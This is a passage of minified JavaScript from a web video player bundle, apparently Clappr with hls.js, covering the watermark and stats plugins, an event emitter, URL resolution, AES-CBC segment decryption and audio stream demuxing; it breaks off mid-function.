t={startupTime:this.startupTime,rebuffers:this.rebuffers,rebufferingTime:this.isRebuffering()?this.rebufferingTime+this.getRebufferingTime():this.rebufferingTime,watchingTime:this.isRebuffering()?this.getWatchingTime()-this.getRebufferingTime():this.getWatchingTime()};return y.extend(t,this.externalMetrics),t}},{key:"report",value:function e(){this.container.statsReport(this.getStats())}}]),n}(a);dn(".clappr-watermark[data-watermark] {\n  position: absolute;\n  min-width: 70px;\n  max-width: 200px;\n  width: 12%;\n  text-align: center;\n  z-index: 10; }\n\n.clappr-watermark[data-watermark] a {\n  outline: none;\n  cursor: pointer; }\n\n.clappr-watermark[data-watermark] img {\n  max-width: 100%; }\n\n.clappr-watermark[data-watermark-bottom-left] {\n  bottom: 10px;\n  left: 10px; }\n\n.clappr-watermark[data-watermark-bottom-right] {\n  bottom: 10px;\n  right: 42px; }\n\n.clappr-watermark[data-watermark-top-left] {\n  top: 10px;\n  left: 10px; }\n\n.clappr-watermark[data-watermark-top-right] {\n  top: 10px;\n  right: 37px; }\n");for(var P={ClickToPause:ln,ClosedCaptions:hn,DVRControls:gn,EndVideo:An,ErrorScreen:bn,Favicon:Sn,GoogleAnalytics:Cn,MediaControl:Gn,Poster:Hn,SeekTime:qn,SpinnerThreeBounce:Qn,Stats:Jn,WaterMark:function(e){L(n,e);var r=I(n);function n(e){var t;return w(this,n),(t=r.call(this,e)).configure(),t}return O(n,[{key:"name",get:function e(){return"watermark"}},{key:"supportedVersion",get:function e(){return{min:"0.4.18"}}},{key:"template",get:function e(){return _('<div class="clappr-watermark" data-watermark data-watermark-<%=position %>>\n<% if(typeof imageLink !== \'undefined\') { %>\n<a target="_blank" href="<%= imageLink %>">\n<% } %>\n<img src="<%= imageUrl %>">\n<% if(typeof imageLink !== \'undefined\') { %>\n</a>\n<% } %>\n</div>\n')}},{key:"bindEvents",value:function e(){this.listenTo(this.container,k.CONTAINER_PLAY,this.onPlay),this.listenTo(this.container,k.CONTAINER_STOP,this.onStop),this.listenTo(this.container,k.CONTAINER_OPTIONS_CHANGE,this.configure)}},{key:"configure",value:function e(){this.position=this.options.position||"bottom-right",this.options.watermark?(this.imageUrl=this.options.watermark,this.imageLink=this.options.watermarkLink,this.render()):this.$el.remove()}},{key:"onPlay",value:function e(){this.hidden||this.$el.show()}},{key:"onStop",value:function e(){this.$el.hide()}},{key:"render",value:function e(){this.$el.hide();var t={position:this.position,imageUrl:this.imageUrl,imageLink:this.imageLink};return this.$el.html(this.template(t)),this.container.$el.append(this.$el),this}}]),n}(C)},ii=0,ai=Object.values(P);ii<ai.length;ii++){var si=ai[ii];o.registerPlugin(si)}var oi=P.ClickToPause,li=P.ClosedCaptions,ui=P.DVRControls,ci=P.EndVideo,di=P.ErrorScreen,fi=P.Favicon,hi=P.GoogleAnalytics,pi=P.MediaControl,vi=P.Poster,gi=P.SeekTime,Ai=P.SpinnerThreeBounce,mi=P.Stats,yi=P.WaterMark,Ei=F(F({},Qr),{},{ClickToPause:oi,ClosedCaptions:li,DVRControls:ui,EndVideo:ci,ErrorScreen:di,Favicon:fi,GoogleAnalytics:hi,MediaControl:pi,Poster:vi,SeekTime:gi,SpinnerThreeBounce:Ai,Stats:mi,WaterMark:yi,Vendor:wn,Plugins:P,version:"0.4.6"});function bi(t,e){var r=Object.keys(t);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(t);e&&(n=n.filter((function(e){return Object.getOwnPropertyDescriptor(t,e).enumerable}))),r.push.apply(r,n)}return r}function ki(t){for(var e=1;e<arguments.length;e++){var r=null!=arguments[e]?arguments[e]:{};e%2?bi(Object(r),!0).forEach((function(e){Ci(t,e,r[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(t,Object.getOwnPropertyDescriptors(r)):bi(Object(r)).forEach((function(e){Object.defineProperty(t,e,Object.getOwnPropertyDescriptor(r,e))}))}return t}function Ti(e,t){for(var r=0;r<t.length;r++){var n=t[r];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}function Ci(e,t,r){return t in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r,e}function N(e){return N=Object.setPrototypeOf?Object.getPrototypeOf:function e(t){return t.__proto__||Object.getPrototypeOf(t)},N(e)}function wi(e,t){return wi=Object.setPrototypeOf||function e(t,r){return t.__proto__=r,t},wi(e,t)}function Ii(e,t){return!t||"object"!=typeof t&&"function"!=typeof t?function Li(e){if(void 0===e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return e}(e):t}function Di(i){var a=function Oi(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(e){return!1}}();return function e(){var r,t=N(i);if(a){var n=N(this).constructor;r=Reflect.construct(t,arguments,n)}else r=t.apply(this,arguments);return Ii(this,r)}}function Ni(e,t,r){return Ni="undefined"!=typeof Reflect&&Reflect.get?Reflect.get:function e(t,r,n){var i=function Pi(e,t){for(;!Object.prototype.hasOwnProperty.call(e,t)&&null!==(e=N(e)););return e}(t,r);if(i){var a=Object.getOwnPropertyDescriptor(i,r);return a.get?a.get.call(n):a.value}},Ni(e,t,r||e)}function xi(e){return function Mi(e){if(Array.isArray(e))return Ui(e)}(e)||function Fi(e){if("undefined"!=typeof Symbol&&null!=e[Symbol.iterator]||null!=e["@@iterator"])return Array.from(e)}(e)||function Bi(e,t){if(!e)return;if("string"==typeof e)return Ui(e,t);var r=Object.prototype.toString.call(e).slice(8,-1);"Object"===r&&e.constructor&&(r=e.constructor.name);if("Map"===r||"Set"===r)return Array.from(e);if("Arguments"===r||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r))return Ui(e,t)}(e)||function ji(){throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function Ui(e,t){(null==t||t>e.length)&&(t=e.length);for(var r=0,n=new Array(t);r<t;r++)n[r]=e[r];return n}"undefined"!=typeof globalThis?globalThis:"undefined"!=typeof window?window:void 0!==Qi||"undefined"!=typeof self&&self;var Ki={exports:{}},Yi=Ki,x=("undefined"!=typeof window&&function e(t,r){Yi.exports=r()}(0,(function(){return function(r){var n={};function i(e){if(n[e])return n[e].exports;var t=n[e]={i:e,l:!1,exports:{}};return r[e].call(t.exports,t,t.exports,i),t.l=!0,t.exports}return i.m=r,i.c=n,i.d=function(e,t,r){i.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:r})},i.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},i.t=function(t,e){if(1&e&&(t=i(t)),8&e)return t;if(4&e&&"object"==typeof t&&t&&t.__esModule)return t;var r=Object.create(null);if(i.r(r),Object.defineProperty(r,"default",{enumerable:!0,value:t}),2&e&&"string"!=typeof t)for(var n in t)i.d(r,n,function(e){return t[e]}.bind(null,n));return r},i.n=function(t){var e=t&&t.__esModule?function e(){return t.default}:function e(){return t};return i.d(e,"a",e),e},i.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},i.p="/dist/",i(i.s="./src/hls.ts")}({"./node_modules/eventemitter3/index.js":function(e,t,r){var i=Object.prototype.hasOwnProperty,p="~";function n(){}function o(e,t,r){this.fn=e,this.context=t,this.once=r||!1}function a(e,t,r,n,i){if("function"!=typeof r)throw new TypeError("The listener must be a function");var a=new o(r,n||e,i),s=p?p+t:t;return e._events[s]?e._events[s].fn?e._events[s]=[e._events[s],a]:e._events[s].push(a):(e._events[s]=a,e._eventsCount++),e}function c(e,t){0==--e._eventsCount?e._events=new n:delete e._events[t]}function s(){this._events=new n,this._eventsCount=0}Object.create&&(n.prototype=Object.create(null),(new n).__proto__||(p=!1)),s.prototype.eventNames=function e(){var r,n,t=[];if(0===this._eventsCount)return t;for(n in r=this._events)i.call(r,n)&&t.push(p?n.slice(1):n);return Object.getOwnPropertySymbols?t.concat(Object.getOwnPropertySymbols(r)):t},s.prototype.listeners=function e(t){var r=p?p+t:t,n=this._events[r];if(!n)return[];if(n.fn)return[n.fn];for(var i=0,a=n.length,s=new Array(a);i<a;i++)s[i]=n[i].fn;return s},s.prototype.listenerCount=function e(t){var r=p?p+t:t,n=this._events[r];return n?n.fn?1:n.length:0},s.prototype.emit=function e(t,r,n,i,a,s){var o=p?p+t:t;if(!this._events[o])return!1;var c,d,l=this._events[o],u=arguments.length;if(l.fn){switch(l.once&&this.removeListener(t,l.fn,void 0,!0),u){case 1:return l.fn.call(l.context),!0;case 2:return l.fn.call(l.context,r),!0;case 3:return l.fn.call(l.context,r,n),!0;case 4:return l.fn.call(l.context,r,n,i),!0;case 5:return l.fn.call(l.context,r,n,i,a),!0;case 6:return l.fn.call(l.context,r,n,i,a,s),!0}for(d=1,c=new Array(u-1);d<u;d++)c[d-1]=arguments[d];l.fn.apply(l.context,c)}else{var h,f=l.length;for(d=0;d<f;d++)switch(l[d].once&&this.removeListener(t,l[d].fn,void 0,!0),u){case 1:l[d].fn.call(l[d].context);break;case 2:l[d].fn.call(l[d].context,r);break;case 3:l[d].fn.call(l[d].context,r,n);break;case 4:l[d].fn.call(l[d].context,r,n,i);break;default:if(!c)for(h=1,c=new Array(u-1);h<u;h++)c[h-1]=arguments[h];l[d].fn.apply(l[d].context,c)}}return!0},s.prototype.on=function e(t,r,n){return a(this,t,r,n,!1)},s.prototype.once=function e(t,r,n){return a(this,t,r,n,!0)},s.prototype.removeListener=function e(t,r,n,i){var a=p?p+t:t;if(!this._events[a])return this;if(!r)return c(this,a),this;var s=this._events[a];if(s.fn)s.fn!==r||i&&!s.once||n&&s.context!==n||c(this,a);else{for(var o=0,l=[],u=s.length;o<u;o++)(s[o].fn!==r||i&&!s[o].once||n&&s[o].context!==n)&&l.push(s[o]);l.length?this._events[a]=1===l.length?l[0]:l:c(this,a)}return this},s.prototype.removeAllListeners=function e(t){var r;return t?(r=p?p+t:t,this._events[r]&&c(this,r)):(this._events=new n,this._eventsCount=0),this},s.prototype.off=s.prototype.removeListener,s.prototype.addListener=s.prototype.on,s.prefixed=p,s.EventEmitter=s,e.exports=s},"./node_modules/url-toolkit/src/url-toolkit.js":function(i,e,t){!function(e){var r=/^((?:[a-zA-Z0-9+\-.]+:)?)(\/\/[^\/?#]*)?((?:[^\/?#]*\/)*[^;?#]*)?(;[^?#]*)?(\?[^#]*)?(#.*)?$/,c=/^([^\/?#]*)(.*)$/,t=/(?:\/|^)\.(?=\/)/g,n=/(?:\/|^)\.\.\/(?!\.\.\/)[^\/]*(?=\/)/g,d={buildAbsoluteURL:function(e,t,r){if(r=r||{},e=e.trim(),!(t=t.trim())){if(!r.alwaysNormalize)return e;var n=d.parseURL(e);if(!n)throw new Error("Error trying to parse base URL.");return n.path=d.normalizePath(n.path),d.buildURLFromParts(n)}var i=d.parseURL(t);if(!i)throw new Error("Error trying to parse relative URL.");if(i.scheme)return r.alwaysNormalize?(i.path=d.normalizePath(i.path),d.buildURLFromParts(i)):t;var a=d.parseURL(e);if(!a)throw new Error("Error trying to parse base URL.");if(!a.netLoc&&a.path&&"/"!==a.path[0]){var s=c.exec(a.path);a.netLoc=s[1],a.path=s[2]}a.netLoc&&!a.path&&(a.path="/");var o={scheme:a.scheme,netLoc:i.netLoc,path:null,params:i.params,query:i.query,fragment:i.fragment};if(!i.netLoc&&(o.netLoc=a.netLoc,"/"!==i.path[0]))if(i.path){var l=a.path,u=l.substring(0,l.lastIndexOf("/")+1)+i.path;o.path=d.normalizePath(u)}else o.path=a.path,i.params||(o.params=a.params,i.query||(o.query=a.query));return null===o.path&&(o.path=r.alwaysNormalize?d.normalizePath(i.path):i.path),d.buildURLFromParts(o)},parseURL:function(e){var t=r.exec(e);return t?{scheme:t[1]||"",netLoc:t[2]||"",path:t[3]||"",params:t[4]||"",query:t[5]||"",fragment:t[6]||""}:null},normalizePath:function(e){for(e=e.split("").reverse().join("").replace(t,"");e.length!==(e=e.replace(n,"")).length;);return e.split("").reverse().join("")},buildURLFromParts:function(e){return e.scheme+e.netLoc+e.path+e.params+e.query+e.fragment}};i.exports=d}()},"./node_modules/webworkify-webpack/index.js":function(e,t,f){function u(r){var n={};function i(e){if(n[e])return n[e].exports;var t=n[e]={i:e,l:!1,exports:{}};return r[e].call(t.exports,t,t.exports,i),t.l=!0,t.exports}i.m=r,i.c=n,i.i=function(e){return e},i.d=function(e,t,r){i.o(e,t)||Object.defineProperty(e,t,{configurable:!1,enumerable:!0,get:r})},i.r=function(e){Object.defineProperty(e,"__esModule",{value:!0})},i.n=function(t){var e=t&&t.__esModule?function e(){return t.default}:function e(){return t};return i.d(e,"a",e),e},i.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},i.p="/",i.oe=function(e){throw console.error(e),e};var e=i(i.s=ENTRY_MODULE);return e.default||e}var h="[\\.|\\-|\\+|\\w|/|@]+",p="\\(\\s*(/\\*.*?\\*/)?\\s*.*?("+h+").*?\\)";function v(e){return(e+"").replace(/[.?*+^$[\]\\(){}|-]/g,"\\$&")}function g(e){return!isNaN(1*e)}function A(e,t,r){var n={};n[r]=[];var i=t.toString(),a=i.match(/^function\s?\w*\(\w+,\s*\w+,\s*(\w+)\)/);if(!a)return n;for(var l,s=a[1],o=new RegExp("(\\\\n|\\W)"+v(s)+p,"g");l=o.exec(i);)"dll-reference"!==l[3]&&n[r].push(l[3]);for(o=new RegExp("\\("+v(s)+'\\("(dll-reference\\s('+h+'))"\\)\\)'+p,"g");l=o.exec(i);)e[l[2]]||(n[r].push(l[1]),e[l[2]]=f(l[1]).m),n[l[2]]=n[l[2]]||[],n[l[2]].push(l[4]);for(var u=Object.keys(n),c=0;c<u.length;c++)for(var d=0;d<n[u[c]].length;d++)g(n[u[c]][d])&&(n[u[c]][d]=1*n[u[c]][d]);return n}function m(r){return Object.keys(r).reduce((function(e,t){return e||r[t].length>0}),!1)}e.exports=function(e,t){t=t||{};var r={main:f.m},n=t.all?{main:Object.keys(r.main)}:function c(e,t){for(var r={main:[t]},n={main:[]},i={main:{}};m(r);)for(var a=Object.keys(r),s=0;s<a.length;s++){var o=a[s],u=r[o].pop();if(i[o]=i[o]||{},!i[o][u]&&e[o][u]){i[o][u]=!0,n[o]=n[o]||[],n[o].push(u);for(var c=A(e,e[o][u],o),d=Object.keys(c),f=0;f<d.length;f++)r[d[f]]=r[d[f]]||[],r[d[f]]=r[d[f]].concat(c[d[f]])}}return n}(r,e),i="";Object.keys(n).filter((function(e){return"main"!==e})).forEach((function(t){for(var e=0;n[t][e];)e++;n[t].push(e),r[t][e]="(function(module, exports, __webpack_require__) { module.exports = __webpack_require__; })",i=i+"var "+t+" = ("+u.toString().replace("ENTRY_MODULE",JSON.stringify(e))+")({"+n[t].map((function(e){return JSON.stringify(e)+": "+r[t][e].toString()})).join(",")+"});\n"})),i=i+"new (("+u.toString().replace("ENTRY_MODULE",JSON.stringify(e))+")({"+n.main.map((function(e){return JSON.stringify(e)+": "+r.main[e].toString()})).join(",")+"}))(self);";var a=new window.Blob([i],{type:"text/javascript"});if(t.bare)return a;var o=(window.URL||window.webkitURL||window.mozURL||window.msURL).createObjectURL(a),l=new window.Worker(o);return l.objectURL=o,l}},"./src/crypt/decrypter.js":function(e,t,r){r.r(t);var l=function(){function e(e,t){this.subtle=e,this.aesIV=t}return e.prototype.decrypt=function e(t,r){return this.subtle.decrypt({name:"AES-CBC",iv:this.aesIV},r,t)},e}(),n=function(){function e(e,t){this.subtle=e,this.key=t}return e.prototype.expandKey=function e(){return this.subtle.importKey("raw",this.key,{name:"AES-CBC"},!1,["encrypt","decrypt"])},e}(),u=n;var i=function(){function e(){this.rcon=[0,1,2,4,8,16,32,64,128,27,54],this.subMix=[new Uint32Array(256),new Uint32Array(256),new Uint32Array(256),new Uint32Array(256)],this.invSubMix=[new Uint32Array(256),new Uint32Array(256),new Uint32Array(256),new Uint32Array(256)],this.sBox=new Uint32Array(256),this.invSBox=new Uint32Array(256),this.key=new Uint32Array(0),this.initTable()}var t=e.prototype;return t.uint8ArrayToUint32Array_=function e(t){for(var r=new DataView(t),n=new Uint32Array(4),i=0;i<4;i++)n[i]=r.getUint32(4*i);return n},t.initTable=function e(){var t=this.sBox,r=this.invSBox,n=this.subMix,i=n[0],a=n[1],s=n[2],o=n[3],l=this.invSubMix,u=l[0],c=l[1],d=l[2],f=l[3],h=new Uint32Array(256),p=0,v=0,g=0;for(g=0;g<256;g++)h[g]=g<128?g<<1:g<<1^283;for(g=0;g<256;g++){var A=v^v<<1^v<<2^v<<3^v<<4;A=A>>>8^255&A^99,t[p]=A,r[A]=p;var m=h[p],y=h[m],E=h[y],b=257*h[A]^16843008*A;i[p]=b<<24|b>>>8,a[p]=b<<16|b>>>16,s[p]=b<<8|b>>>24,o[p]=b,b=16843009*E^65537*y^257*m^16843008*p,u[A]=b<<24|b>>>8,c[A]=b<<16|b>>>16,d[A]=b<<8|b>>>24,f[A]=b,p?(p=m^h[h[h[E^m]]],v^=h[h[v]]):p=v=1}},t.expandKey=function e(t){for(var r=this.uint8ArrayToUint32Array_(t),n=!0,i=0;i<r.length&&n;)n=r[i]===this.key[i],i++;if(!n){this.key=r;var a=this.keySize=r.length;if(4!==a&&6!==a&&8!==a)throw new Error("Invalid aes key size="+a);var o,l,m,y,s=this.ksRows=4*(a+6+1),u=this.keySchedule=new Uint32Array(s),c=this.invKeySchedule=new Uint32Array(s),d=this.sBox,f=this.rcon,h=this.invSubMix,p=h[0],v=h[1],g=h[2],A=h[3];for(o=0;o<s;o++)o<a?m=u[o]=r[o]:(y=m,o%a==0?(y=d[(y=y<<8|y>>>24)>>>24]<<24|d[y>>>16&255]<<16|d[y>>>8&255]<<8|d[255&y],y^=f[o/a|0]<<24):a>6&&o%a==4&&(y=d[y>>>24]<<24|d[y>>>16&255]<<16|d[y>>>8&255]<<8|d[255&y]),u[o]=m=(u[o-a]^y)>>>0);for(l=0;l<s;l++)o=s-l,y=3&l?u[o]:u[o-4],c[l]=l<4||o<=4?y:p[d[y>>>24]]^v[d[y>>>16&255]]^g[d[y>>>8&255]]^A[d[255&y]],c[l]=c[l]>>>0}},t.networkToHostOrderSwap=function e(t){return t<<24|(65280&t)<<8|(16711680&t)>>8|t>>>24},t.decrypt=function e(t,r,n,i){for(var E,b,k,_,T,S,C,R,w,O,L,I,D,P,a=this.keySize+6,s=this.invKeySchedule,o=this.invSBox,l=this.invSubMix,u=l[0],c=l[1],d=l[2],f=l[3],h=this.uint8ArrayToUint32Array_(n),p=h[0],v=h[1],g=h[2],A=h[3],m=new Int32Array(t),y=new Int32Array(m.length),N=this.networkToHostOrderSwap;r<m.length;){for(w=N(m[r]),O=N(m[r+1]),L=N(m[r+2]),I=N(m[r+3]),T=w^s[0],S=I^s[1],C=L^s[2],R=O^s[3],D=4,P=1;P<a;P++)E=u[T>>>24]^c[S>>16&255]^d[C>>8&255]^f[255&R]^s[D],b=u[S>>>24]^c[C>>16&255]^d[R>>8&255]^f[255&T]^s[D+1],k=u[C>>>24]^c[R>>16&255]^d[T>>8&255]^f[255&S]^s[D+2],_=u[R>>>24]^c[T>>16&255]^d[S>>8&255]^f[255&C]^s[D+3],T=E,S=b,C=k,R=_,D+=4;E=o[T>>>24]<<24^o[S>>16&255]<<16^o[C>>8&255]<<8^o[255&R]^s[D],b=o[S>>>24]<<24^o[C>>16&255]<<16^o[R>>8&255]<<8^o[255&T]^s[D+1],k=o[C>>>24]<<24^o[R>>16&255]<<16^o[T>>8&255]<<8^o[255&S]^s[D+2],_=o[R>>>24]<<24^o[T>>16&255]<<16^o[S>>8&255]<<8^o[255&C]^s[D+3],D+=3,y[r]=N(E^p),y[r+1]=N(_^v),y[r+2]=N(k^g),y[r+3]=N(b^A),p=w,v=O,g=L,A=I,r+=4}return i?function x(e){var t=e.byteLength,r=t&&new DataView(e).getUint8(t-1);return r?e.slice(0,t-r):e}(y.buffer):y.buffer},t.destroy=function e(){this.key=void 0,this.keySize=void 0,this.ksRows=void 0,this.sBox=void 0,this.invSBox=void 0,this.subMix=void 0,this.invSubMix=void 0,this.keySchedule=void 0,this.invKeySchedule=void 0,this.rcon=void 0},e}(),c=i,s=r("./src/errors.ts"),d=r("./src/utils/logger.js"),o=r("./src/events.js"),a=r("./src/utils/get-self-scope.js"),f=Object(a.getSelfScope)(),h=function(){function e(e,t,r){var i=(void 0===r?{}:r).removePKCS7Padding,a=void 0===i||i;if(this.logEnabled=!0,this.observer=e,this.config=t,this.removePKCS7Padding=a,a)try{var s=f.crypto;s&&(this.subtle=s.subtle||s.webkitSubtle)}catch(e){}this.disableWebCrypto=!this.subtle}var t=e.prototype;return t.isSync=function e(){return this.disableWebCrypto&&this.config.enableSoftwareAES},t.decrypt=function e(r,n,i,a){var s=this;if(this.disableWebCrypto&&this.config.enableSoftwareAES){this.logEnabled&&(d.logger.log("JS AES decrypt"),this.logEnabled=!1);var t=this.decryptor;t||(this.decryptor=t=new c),t.expandKey(n),a(t.decrypt(r,0,i,this.removePKCS7Padding))}else{this.logEnabled&&(d.logger.log("WebCrypto AES decrypt"),this.logEnabled=!1);var o=this.subtle;this.key!==n&&(this.key=n,this.fastAesKey=new u(o,n)),this.fastAesKey.expandKey().then((function(e){new l(o,i).decrypt(r,e).catch((function(e){s.onWebCryptoError(e,r,n,i,a)})).then((function(e){a(e)}))})).catch((function(e){s.onWebCryptoError(e,r,n,i,a)}))}},t.onWebCryptoError=function e(t,r,n,i,a){this.config.enableSoftwareAES?(d.logger.log("WebCrypto Error, disable WebCrypto API"),this.disableWebCrypto=!0,this.logEnabled=!0,this.decrypt(r,n,i,a)):(d.logger.error("decrypting error : "+t.message),this.observer.trigger(o.default.ERROR,{type:s.ErrorTypes.MEDIA_ERROR,details:s.ErrorDetails.FRAG_DECRYPT_ERROR,fatal:!0,reason:t.message}))},t.destroy=function e(){var t=this.decryptor;t&&(t.destroy(),this.decryptor=void 0)},e}();t.default=h},"./src/demux/demuxer-inline.js":function(S,e,t){t.r(e);var oe=t("./src/events.js"),le=t("./src/errors.ts"),g=t("./src/crypt/decrypter.js"),v=t("./src/polyfills/number.js"),ue=t("./src/utils/logger.js"),r=t("./src/utils/get-self-scope.js");function a(e,t){return 255===e[t]&&240==(246&e[t+1])}function u(e,t){return 1&e[t+1]?7:9}function c(e,t){return(3&e[t+3])<<11|e[t+4]<<3|(224&e[t+5])>>>5}function m(e,t){return!!(t+1<e.length&&a(e,t))}function o(e,t){if(m(e,t)){var r=u(e,t);if(t+r>=e.length)return!1;var n=c(e,t);if(n<=r)return!1;var i=t+n;if(i===e.length||i+1<e.length&&a(e,i))return!0}return!1}function y(e,t,r,n,i){if(!e.samplerate){var a=function s(e,t,r,n){var i,a,s,o,l,u=navigator.userAgent.toLowerCase(),c=n,d=[96e3,88200,64e3,48e3,44100,32e3,24e3,22050,16e3,12e3,11025,8e3,7350];if(i=1+((192&t[r+2])>>>6),!((a=(60&t[r+2])>>>2)>d.length-1))return o=(1&t[r+2])<<2,o|=(192&t[r+3])>>>6,ue.logger.log("manifest codec:"+n+",ADTS data:type:"+i+",sampleingIndex:"+a+"["+d[a]+"Hz],channelConfig:"+o),/firefox/i.test(u)?a>=6?(i=5,l=new Array(4),s=a-3):(i=2,l=new Array(2),s=a):-1!==u.indexOf("android")?(i=2,l=new Array(2),s=a):(i=5,l=new Array(4),n&&(-1!==n.indexOf("mp4a.40.29")||-1!==n.indexOf("mp4a.40.5"))||!n&&a>=6?s=a-3:((n&&-1!==n.indexOf("mp4a.40.2")&&(a>=6&&1===o||/vivaldi/i.test(u))||!n&&1===o)&&(i=2,l=new Array(2)),s=a)),l[0]=i<<3,l[0]|=(14&a)>>1,l[1]|=(1&a)<<7,l[1]|=o<<3,5===i&&(l[1]|=(14&s)>>1,l[2]=(1&s)<<7,l[2]|=8,l[3]=0),{config:l,samplerate:d[a],channelCount:o,codec:"mp4a.40."+i,manifestCodec:c};e.trigger(oe.default.ERROR,{type:le.ErrorTypes.MEDIA_ERROR,details:le.ErrorDetails.FRAG_PARSING_ERROR,fatal:!0,reason:"invalid ADTS sampling index:"+a})}(t,r,n,i);e.config=a.config,e.samplerate=a.samplerate,e.channelCount=a.channelCount,e.codec=a.codec,e.manifestCodec=a.manifestCodec,ue.logger.log("parsed codec:"+e.codec+",rate:"+a.samplerate+",nb channel:"+a.channelCount)}}function E(e){return 9216e4/e}function d(e,t,r,n,i){var a,s,l=e.length;if(a=u(e,t),s=c(e,t),(s-=a)>0&&t+a+s<=l)return{headerLength:a,frameLength:s,stamp:r+n*i}}function b(e,t,r,n,i){var s=d(t,r,n,i,E(e.samplerate));if(s){var o=s.stamp,l=s.headerLength,u=s.frameLength,c={unit:t.subarray(r+l,r+l+u),pts:o,dts:o};return e.samples.push(c),{sample:c,length:u+l}}}var N=t("./src/demux/id3.js"),n=function(){function e(e,t,r){this.observer=e,this.config=r,this.remuxer=t}var t=e.prototype;return t.resetInitSegment=function e(t,r,n,i){this._audioTrack={container:"audio/adts",type:"audio",id:0,sequenceNumber:0,isAAC:!0,samples:[],len:0,manifestCodec:r,duration:i,inputTimeScale:9e4}},t.resetTimeStamp=function e(){},e.probe=function e(t){if(!t)return!1;for(var n=(N.default.getID3Data(t,0)||[]).length,i=t.length;n<i;n++)if(o(t,n))return ue.logger.log("ADTS sync word found !"),!0;return!1},t.append=function e(t,r,n,i){for(var a=this._audioTrack,s=N.default.getID3Data(t,0)||[],o=N.default.getTimeStamp(s),l=Object(v.isFiniteNumber)(o)?90*o:9e4*r,u=0,c=l,d=t.length,f=s.length,h=[{pts:c,dts:c,data:s}];f<d-1;)if(m(t,f)&&f+5<d){y(a,this.observer,t,f,a.manifestCodec);var p=b(a,t,f,l,u);if(!p){ue.logger.log("Unable to parse AAC frame");break}f+=p.length,c=p.sample.pts,u++}else N.default.isHeader(t,f)?(s=N.default.getID3Data(t,f),h.push({pts:c,dts:c,data:s}),f+=s.length):f++;this.remuxer.remux(a,{samples:[]},{samples:h,inputTimeScale:9e4},{samples:[]},r,n,i)},t.destroy=function e(){},e}(),C=n,R=t("./src/demux/mp4demuxer.js"),A={BitratesMap:[32,64,96,128,160,192,224,256,288,320,352,384,416,448,32,48,56,64,80,96,112,128,160,192,224,256,320,384,32,40,48,56,64,80,96,112,128,160,192,224,256,320,32,48,56,64,80,96,112,128,144,160,176,192,224,256,8,16,24,32,40,48,56,64,80,96,112,128,144,160],SamplingRateMap:[44100,48e3,32e3,22050,24e3,16e3,11025,12e3,8e3],SamplesCoefficients:[[0,72,144,12],[0,0,0,0],[0,72,144,12],[0,144,144,12]],BytesInSlot:[0,1,1,4],appendFrame:function e(t,r,n,i,a){if(!(n+24>r.length)){var s=this.parseHeader(r,n);if(s&&n+s.frameLength<=r.length){var l=i+a*(9e4*s.samplesPerFrame/s.sampleRate),u={unit:r.subarray(n,n+s.frameLength),pts:l,dts:l};return t.config=[],t.channelCount=s.channelCount,t.samplerate=s.sampleRate,t.samples.push(u),{sample:u,length:s.frameLength}}}},parseHeader:function e(t,r){var n=t[r+1]>>3&3,i=t[r+1]>>1&3,a=t[r+2]>>4&15,s=t[r+2]>>2&3,o=t[r+2]>>1&1;if(1!==n&&0!==a&&15!==a&&3!==s){var l=3===n?3-i:3===i?3:4,u=1e3*A.BitratesMap[14*l+a-1],c=3===n?0:2===n?1:2,d=A.SamplingRateMap[3*c+s],f=t[r+3]>>6==3?1:2,h=A.SamplesCoefficients[n][i],p=A.BytesInSlot[i],v=8*h*p;return{sampleRate:d,channelCount:f,frameLength:parseInt(h*u/d+o,10)*p,samplesPerFrame:v}}},isHeaderPattern:function e(t,r){return!(255!==t[r]||224&~t[r+1]||!(6&t[r+1]))},isHeader:function e(t,r){return!!(r+1<t.length&&this.isHeaderPattern(t,r))},probe:function e(t,r){if(r+1<t.length&&this.isHeaderPattern(t,r)){var i=this.parseHeader(t,r),a=4;i&&i.frameLength&&(a=i.frameLength);var s=r+a;if(s===t.length||s+1<t.length&&this.isHeaderPattern(t,s))return!0}return!1}},k=A,w=function(){function e(e){this.data=e,this.bytesAvailable=e.byteLength,this.word=0,this.bitsAvailable=0}var t=e.prototype;return t.loadWord=function e(){var t=this.data,r=this.bytesAvailable,n=t.byteLength-r,i=new Uint8Array(4),a=Math.min(4,r);if(0===a)throw new Error("no bytes available");i.set(t.subarray(n,n+a)),this.word=new DataView(i.buffer).getUint32(0),this.bitsAvailable=8*a,this.bytesAvailable-=a},t.skipBits=function e(t){var r;this.bitsAvailable>t?(this.word<<=t,this.bitsAvailable-=t):(t-=this.bitsAvailable,t-=(r=t>>3)>>3,this.bytesAvailable-=r,this.loadWord(),this.word<<=t,this.bitsAvailable-=t)},t.readBits=function e(t){var r=Math.min(this.bitsAvailable,t),n=this.word>>>32-r;return t>32&&ue.logger.error("Cannot read more than 32 bits at a time"),this.bitsAvailable-=r,this.bitsAvailable>0?this.word<<=r:this.bytesAvailable>0&&this.loadWord(),(r=t-r)>0&&this.bitsAvailable?n<<r|this.readBits(r):n},t.skipLZ=function e(){var t;for(t=0;t<this.bitsAvailable;++t)if(this.word&2147483648>>>t)return this.word<<=t,this.bitsAvailable-=t,t;return this.loadWord(),t+this.skipLZ()},t.skipUEG=function e(){this.skipBits(1+this.skipLZ())},t.skipEG=function e(){this.skipBits(1+this.skipLZ())},t.readUEG=function e(){var t=this.skipLZ();return this.readBits(t+1)-1},t.readEG=function e(){var t=this.readUEG();return 1&t?1+t>>>1:-1*(t>>>1)},t.readBoolean=function e(){return 